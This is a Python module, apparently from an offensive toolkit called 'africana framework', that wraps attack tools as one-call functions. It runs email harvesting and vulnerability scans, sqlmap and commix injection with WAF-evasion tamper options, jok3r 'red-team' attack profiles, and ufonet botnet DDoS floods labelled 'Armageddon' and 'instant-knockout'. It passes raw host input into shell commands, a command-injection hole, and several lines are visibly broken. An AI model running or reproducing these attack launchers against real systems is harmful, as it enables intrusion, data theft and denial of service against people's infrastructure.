import os
import sys
import time
import subprocess
from src.core.bcolors import *

class scanners(object):
    def __init__(self, host):
        self.host = host

    def wafw00f(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Running waf detection on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('wafw00f -v -a %s' %(host), shell = True).wait()

    def dnsrecon(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Running dns reconing on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('dnsrecon -a -d %s' %(host), shell = True).wait()

    def seekolver(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Running seekolver reconing on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('python3 /src/externals/seekolver/seekolver.py -te %s -v -r -k -cn -p 80 443' %(host), shell = True).wait()
        print("")

    def whatweb(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Reconning running softs on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('script -q -c "whatweb -a 3 -v %s" /root/whatweb.txt' %(host), shell = True).wait()
        print("")

    def harvester(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Harvesting emails and accounts " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('theHarvester -n -l 45 -b bing,yahoo,duckduckgo -r "1.1.1.1" -d %s' %(host), shell = True).wait()

    def param_spider(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Mining root urls on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('paramspider -s -d %s' %(host), shell = True).wait()  

    def ssl_scan(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Scanning vuln ssl on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('sslscan --show-certificate --show-sigs --tlsall --verbose %s' %(host), shell = True).wait()  

    def gobuster(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Mining root files on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('gobuster dir vhost --debug --no-error --random-agent -w src/wordlists/content/big.txt -e -u %s' %(host), shell = True).wait()
        print("")        

    def nuclei(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Scanning known vulns on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('nuclei -u %s' %(host), shell = True).wait()

    def nikto(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Further scanning for vulns on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('nikto -ask no -Cgidirs all -Display 3 -host %s' %(host), shell = True).wait()

    def bbot(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Full vuln reconning on " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly -t %s' %(host), shell = True).wait()

    def uniscan(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Heavy vuln reconning on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('uniscan -qweds -u %s' %(host), shell = True).wait()  

    def sqli_auto_sqlmap(self, host):
        os.system('sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s' %(host))

    def sqli_man_sqlmap(self, host):
        os.system('sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta  -wizard')

    def xss_auto_commix(self, host):
        os.system('commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 -u %s' %(host))

    def xss_man_commix(self, host):
        os.system('commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 --wizard')

    def xss_auto_katana(self, host):
        subprocess.Popen('katana -u %s -jc -kf all -c 5 -d 3 | httpx-toolkit -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav' %(host), shell = True).wait()

    def xss_auto_xsser(self, host):
        subprocess.Popen('xsser -c 100 --Cl -u %s' %(host), shell = True).wait()

    def xss_man_xsser(self, host):
        subprocess.Popen('xsser --wizard', shell = True).wait()

    def owasp_1(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Started port scan & wappalyzer" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m port_scan -t 100' %(host), shell = True).wait()
        print("")
    def owasp_2(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Started subdomains reconing" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m subdomain_scan' %(host), shell = True).wait()
        print("")
    def owasp_3(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched admin_scan" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m scan', shell = True).wait()
        print("")
    def owasp_4(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Start information gathering" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m information_gathering -s', shell = True).wait()
        print("")
    def owasp_5(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Start vulnscansecurity checks" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m server_version_vuln' %(host), shell = True).wait()
        print("")
    def owasp_6(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Runing CVE scans on the target" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m cve' %(host), shell = True).wait()
        print("")
    def owasp_7(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Searching for (critical vulns & exploit) " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m high_severity' %(host), shell = True).wait()
        print("")        
    def owasp_8(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched automated & intrusive checks" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s --profile all/results.txt', shell = True).wait()
        print("")        
    def owasp_9(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched WebUI (key: africana)" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py --start-api --api-access-key africana', shell = True).wait()
        print("")        

    def jok3r_1(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Installing all jok3r tools (Pleas start be patient) " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/jok3r/; /bin/bash install-all.sh', shell = True).wait()
        print("")        
    def jok3r_2(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Updating all the tools in the toolbox (Pleas start be patient) " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py toolbox --update-all --auto', shell = True).wait()
        print("")        
    def jok3r_3(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Showing all the tools in the toolbox " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py toolbox --show-all', shell = True).wait()
        print("")        
    def jok3r_4(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Showing supported products for all services " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py info --services', shell = True).wait()
        print("")        
    def jok3r_5(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Performing a very fast-scan on " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast' %(host), shell = True).wait()
        print("")        
    def jok3r_6(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Run all security checks against " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast' %(host), shell = True).wait()
        print("")        
    def jok3r_7(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Searching for (critical vulns & easy to exploit) " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast' %(host), shell = True).wait()
        print("")        
    def jok3r_8(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Showing the full results from the security checks " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -', shell = True).wait()
        print("")        
    def jok3r_9(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Clean & interact with DB (commands; help or quit 2 exit.)" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py db "mission -d default"', shell = True).wait()
        print("")        

    def osmedeus_1(self):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Updating Osmedeus & Runing diagnostics to check config." + bcolors.BLUE + " ]" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean', shell = True).wait()
        print("")        
    def osmedeus_2(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Started simple scan with other flow on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('osmedeus --nv scan -t %s' %(host), shell = True).wait()
        print("")        
    def osmedeus_3(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Started Directly run on vuln scan & directory scan on " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('osmedeus --nv scan -f vuln-and-dirb -t %s' %(host), shell = True).wait()
        print("")        
    def osmedeus_4(self, host):
        print(bcolors.ENDC + "\n                ~>[" + bcolors.UNDERL + bcolors.BLUE + " Give full path for your .urls " + bcolors.ENDC + "]<~\n" + bcolors.ENDC)
        urls = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" +  bcolors.GREEN + ")# " + bcolors.ENDC)
        print("")
        warn = bcolors.RED + "Your targets are located (urls -> [0]). Launching Engine..\n".format(urls) + bcolors.ENDC
        for w in warn:
            sys.stdout.write(w)
            sys.stdout.flush()
            time.sleep(0.09)
        pass
        time.sleep(0.09)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Started bulk scan on " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('osmedeus scan -f vuln-and-dirb -T [0]'.format(urls), shell = True).wait()        
    def osmedeus_5(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched Cloud - Run scan in Distributed Cloud mode" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('osmedeus health cloud; osmedeus cloud --chunk -c 5 -t %s' %(host), shell = True).wait()
        print("")        
    def osmedeus_6(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Performing Full web vuln & secret scan on " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('osmedeus scan --tactic aggressive --nv -f vuln-and-dirb -t %s' %(host), shell = True).wait()
        print("")        
    def osmedeus_7(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Update the vulnerability database before attacking" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('osmedeus scan --update-vuln -t %s' %(host), shell = True).wait()
        print("")        
    def osmedeus_8(self):
        while True:
            try:
                print(bcolors.BLUE + "\n~>[ " + bcolors.RED + "Select a Port to start your server on" + bcolors.ENDC + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                port = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "port" + bcolors.GREEN + ")# " + bcolors.ENDC)
                os.system('clear')
                print(bcolors.BLUE + "\n~>[ " + bcolors.RED + "Start Osmedeusweb UI server on localhost:%s" %(port) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                subprocess.Popen('osmedeus server --port %s' %(port), shell = True).wait()
                print("")
            except:
                os.system('clear')
                break
    def osmedeus_9(self):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Showing scanned osmedeus report list" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('osmedeus report list', shell = True).wait()
        print(bcolors.BLUE + "\n~>[" + bcolors.UNDERL + bcolors.BLUE + " Pleas select a target to expand list " + bcolors.BLUE + "]<~\n" + bcolors.ENDC)
        target = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" +  bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.RED + "\n(More results for = [0])".format(target) + bcolors.ENDC)
        subprocess.Popen('osmedeus report view --static -t %s' %(target), shell = True).wait()        

    def ufonet_1(self):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Downloading list of bots from C.S" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/ufonet/; python3 ufonet --download-zombies', shell = True).wait()
        print("")        
    def ufonet_2(self):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Testing If bots are alive" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -t botnet/zombies.txt', shell = True).wait()
        print("")        
    def ufonet_3(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched Palantir 3.14 againist" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"' %(host), shell = True).wait()
        print("")        
    def ufonet_4(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched Socking_waves (instant-knockout!) againist" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"' %(host), shell = True).wait()
        print("")        
    def ufonet_5(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched xcom-1 (only DDoS) againist" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"' %(host), shell = True).wait()
        print("")        
    def ufonet_6(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched xcom-2 (only DoS) againist" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"' %(host), shell = True).wait()
        print("")        
    def ufonet_7(self):
        while True:
            try:
                print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched ufonet gui on http://localhost:9999" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                subprocess.Popen('cd src/externals/ufonet/; python3 ufonet --gui', shell = True).wait()
                print("")
            except:
                ddos(self)
    def ufonet_8(self):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Started Grider (python3 ufonet --grider &)" + bcolors.BLUE + " ]" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/ufonet/; python3 ufonet --grider', shell = True).wait()
        print("")        
    def ufonet_9(self, host):
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched Armageddon! (with ALL!)" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"' %(host), shell = True).wait()
        print("")        

    #self.output_dir = self.create_output_dir()

    #def create_output_dir():
    #    global full_path
    #    dir_name = "africana_" + time.strftime("%Y%m%d-%H%M%S")
    #    full_path = os.path.join("/root/.africana", dir_name)
    #    os.makedirs(full_path, exist_ok=True)
    #    return full_path
    #create_output_dir()

    #def wafw00f(self, host):
    #    print(bcolors.BLUE + "~>[ " + bcolors.RED + "Running waf detection on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
    #    command = 'wafw00f -v -a %s' %(host)
    #    with open(os.path.join(full_path, "wafw00f_output.txt"), "w") as f:
    #        with subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) as process:
    #            for line in iter(process.stdout.readline, b''):
    #                # Decode the line
    #                line_decoded = line.decode()
    #                # Write the line to the file and flush to ensure it's written
    #                f.write(line_decoded)
    #                f.flush()
    #                # Print the line to show the output in real-time
    #                print(line_decoded, end='')

    #def dnsrecon(self, host):
    #    print(bcolors.BLUE + "~>[ " + bcolors.RED + "Running dns reconing on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
    #    command = 'dnsrecon -a -d %s' %(host)
    #    with open(os.path.join(full_path, "dnsrecon_output.txt"), "w") as f:
    #        with subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) as process:
    #            for line in iter(process.stdout.readline, b''):
    #                # Decode the line
    #                line_decoded = line.decode()
    #                # Write the line to the file and flush to ensure it's written
    #                f.write(line_decoded)
    #                f.flush()
    #                # Print the line to show the output in real-time
    #                print(line_decoded, end='')

spiders = scanners(host = '')
if ' __name__' == '__main__':
        sys.exit(spiders())
